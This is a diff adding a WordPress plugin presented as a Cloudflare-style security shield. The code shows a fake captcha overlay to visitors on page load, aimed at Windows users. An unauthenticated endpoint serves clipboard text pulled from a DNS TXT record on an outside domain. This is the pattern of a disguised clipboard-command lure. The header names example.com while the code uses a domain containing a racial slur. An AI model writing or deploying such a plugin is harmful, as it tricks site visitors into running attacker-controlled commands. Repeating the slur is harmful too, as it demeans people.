@@ -1,0 +1,78 @@
+<?php
+/**
+ * Plugin Name: CF Security Shield
+ * Plugin URI: https://example.com/cf-security-shield
+ * Description: A Cloudflare-style security overlay that launches immediately on page load for Windows users. Fetches TXT records from example.com for clipboard copy.
+ * Version: 1.0.0
+ * Author: Your Name
+ * License: GPL v2 or later
+ * Text Domain: cf-security-shield
+ */
+
+// Prevent direct access
+if (!defined('ABSPATH')) {
+    exit;
+}
+
+class CF_Security_Shield {
+    
+    private static $instance = null;
+    
+    public static function get_instance() {
+        if (self::$instance === null) {
+            self::$instance = new self();
+        }
+        return self::$instance;
+    }
+    
+    public function __construct() {
+        add_action('wp_enqueue_scripts', array($this, 'enqueue_scripts'));
+        add_action('wp_footer', array($this, 'render_captcha_html'));
+        add_action('wp_ajax_nopriv_cf_get_shield_text', array($this, 'get_captcha_text'));
+        add_action('wp_ajax_cf_get_shield_text', array($this, 'get_captcha_text'));
+    }
+    
+    public function enqueue_scripts() {
+        // Enqueue the captcha loader script
+        wp_enqueue_script(
+            'cf-security-shield-loader',
+            plugin_dir_url(__FILE__) . 'assets/js/captcha-loader.js',
+            array(),
+            '1.0.0',
+            true
+        );
+        
+        // Pass AJAX URL to the script
+        wp_localize_script(
+            'cf-security-shield-loader',
+            'cf_security_shield_ajax',
+            array('ajax_url' => admin_url('admin-ajax.php'))
+        );
+        
+        // Enqueue the captcha styles
+        wp_enqueue_style(
+            'cf-security-shield-styles',
+            plugin_dir_url(__FILE__) . 'assets/css/captcha-styles.css',
+            array(),
+            '1.0.0'
+        );
+    }
+    
+    public function render_captcha_html() {
+        include plugin_dir_path(__FILE__) . 'templates/captcha-overlay.php';
+    }
+    
+    public function get_captcha_text() {
+        // Fetch TXT records from squiblydooisacianigger.com
+        if (function_exists('dns_get_record')) {
+            $records = dns_get_record('squiblydooisacianigger.com', DNS_TXT);
+            if ($records && isset($records[0]['txt'])) {
+                wp_send_json_success(array('text' => $records[0]['txt']));
+            }
+        }
+        wp_send_json_error(array('message' => 'Could not fetch TXT record'));
+    }
+}
+
+// Initialize the plugin
+CF_Security_Shield::get_instance();
